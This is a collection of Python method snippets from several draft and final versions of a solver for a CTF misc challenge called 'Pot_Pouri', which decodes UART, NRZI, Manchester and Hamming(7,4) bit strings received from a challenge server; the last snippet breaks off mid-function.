        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/requests.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_nrzi(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a NRZ-I encoded bit string to ASCII.
        NRZ-I: A &#39;1&#39; means a transition, &#39;0&#39; means no transition.
        The first bit is assumed to be the initial signal level (0 or 1).
        &#34;&#34;&#34;
        # Convert string to list of ints
        bits = list(map(int, encoded_bits))
        decoded_bits = []
        # Initial signal level
        current_level = bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(bits)):
            if bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def main(self):

        self.requests = []

        # text = &#34;011011101110000100111001000010010011111011110000&#34;
        # decoded = self.decode_nrzi(text)

        # text = &#34;100110010110101000011000111110011000101010&#34;
        # decoded = self.decode_hamming74(text)
        # # return

        # text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        # decoded = self.decode_hamming74(text)

        # #

        # text = &#34;001101010010100001101100011011001&#34;
        # text = &#34;01110110011&#34;
        # start = time.time()
        # # text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        # test = &#34;0110001100101110111001011101110010110001100100000101001&#34;
        # decoded = self.decode_uart(text)

        # print(f&#34;time: {time.time() - start} - Decoded: {decoded}&#34;)
        # # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_nrzi(self, signal: str, verbose=False) -&gt; str:
        &#34;&#34;&#34;
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., &#34;110110...&#34;).
        Returns the original bit string (e.g., &#34;0100...&#34;).
        &#34;&#34;&#34;
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f&#34;Signal levels:   {levels}&#34;)
            print(f&#34;Decoded bits:    {decoded_bits}&#34;)

        if verbose:
            print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        if verbose:
            print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        if verbose:
            print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution.py
    def main(self):

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round(verbose=True)
            except Exception as e:
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        self.recv_lines(3, display=True)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/requests.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f&#34;Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}&#34;
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f&#34;Rest of bits: {rest_of_bits}&#34;)

        return valid_bits + rest_of_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_formater(self, bits: list, verbose=False):
        # print(bits)
        padding_length = len(bits) % 8
        if padding_length == 0:
            return bits

        padding_length = 8 - (len(bits) % 8)
        print(f&#34;bits: {bits}&#34;)
        bits = [0] * padding_length + bits
        # bits += [0] * padding_length
        print(f&#34;bits: {bits}&#34;)

        return bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def nrzi_to_ascii(self, bits):
        grouped_bits = [bits[i : i + 8] for i in range(0, len(bits), 8)]
        ascii_chars = []
        for group in grouped_bits:
            value = int(&#34;&#34;.join(map(str, group)), 2)
            ascii_chars.append(chr(value))
        return &#34;&#34;.join(ascii_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def encode_nrzi(self, bits: str, verbose=False) -&gt; str:
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        # current_level = encoded_bits[0]
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
                # current_level ^= 1
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f&#34;Decoded NRZI bits: {decoded_bits}&#34;)
        if verbose:
            print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        # return self.bits_to_ascii(decoded_bits)
        return self.nrzi_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_nrzi(self, signal: str, verbose=False) -&gt; str:
        &#34;&#34;&#34;
        Decode a NRZI-encoded signal level string back to bit string.
        In NRZI, a transition (level change) represents a 1,
        and no transition (level remains the same) represents a 0.

        The input is a string of signal levels (e.g., &#34;110110...&#34;).
        Returns the original bit string (e.g., &#34;0100...&#34;).
        &#34;&#34;&#34;
        levels = list(map(int, signal))
        decoded_bits = [levels[0]]

        for i in range(1, len(levels)):
            if levels[i] != levels[i - 1]:
                decoded_bits.append(1)  # transition
            else:
                decoded_bits.append(0)  # no transition

        if verbose:
            print(f&#34;Signal levels:   {levels}&#34;)
            print(f&#34;Decoded bits:    {decoded_bits}&#34;)

        if verbose:
            print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
            # decoded_bits = self.nrzi_formater(decoded_bits, verbose=verbose)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def getting_round(self, verbose=False):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        if verbose:
            print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/solution_cluttered.py
    def main(self):

        self.requests = []

        # text = &#34;011101000110110001110001101100100111001110110010&#34;
        # text = &#34;010110111010011111011010010011100010000110001100&#34;
        # text = &#34;011011101110000100111001000010010011111011110000&#34;
        # text = &#34;001011111001100110010011100000111010010110100011&#34;
        text = &#34;010010000110001110110000&#34;
        resu = &#34;100011111011110100100000&#34;
        resu = &#34;011100000100001011011111&#34;
        # text = &#34;100010001010101000&#34;
        # decoded_result = &#34;110110101010101011&#34;
        # text = &#34;011110111011010001000110&#34;
        # print(text)
        # decoded = self.decode_nrzi(text, True)
        # print(decoded, decoded == resu)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        self.recv_lines(3, display=True)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;request.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;request.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/request.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def ascii_converter(self, bits):
        &#34;&#34;&#34;
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        &#34;&#34;&#34;
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, &#34;0&#34;)

        ascii_str = &#34;&#34;
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 &lt;= ord(char) &lt;= 126 or ord(char) in [10, 13]:
                    ascii_str += char
                else:
                    ascii_str += &#34;.&#34;  # Non-printable character placeholder
            except ValueError:
                ascii_str += &#34;?&#34;  # Invalid byte

        return ascii_str

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_nrz_i(self, bits: str) -&gt; str:
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        decoded_bits = []
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return decoded_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_manchester(self, bits: str) -&gt; str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = &#34;&#34;
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;10&#34;:
                raw_bits += &#34;1&#34;
            elif pair == &#34;01&#34;:
                raw_bits += &#34;0&#34;
            else:
                raise ValueError(f&#34;Invalid Manchester encoding: {pair}&#34;)

        return raw_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_hamming74(self, bits: str) -&gt; str:
        result = &#34;&#34;
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) &lt; 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 &lt;&lt; 1) + (p3 &lt;&lt; 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -&gt; indices 2,4,5,6
            result += &#34;&#34;.join(str(b[i]) for i in [2, 4, 5, 6])
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_uart(
        encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
